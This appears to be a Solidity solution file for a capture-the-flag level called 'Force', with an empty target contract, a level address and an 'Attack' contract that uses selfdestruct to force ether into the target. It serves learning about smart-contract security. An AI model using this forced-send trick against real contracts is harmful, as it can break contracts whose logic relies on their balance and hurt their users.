// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

//The goal of this level is to make the balance of the contract greater than zero.
//0x6A5f9C534b67b0d9e454ead0e751b960f07eaF6C

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

//solution

contract Attack {

    function forceSend(address target) public payable {
        selfdestruct(payable(target));
    }
}
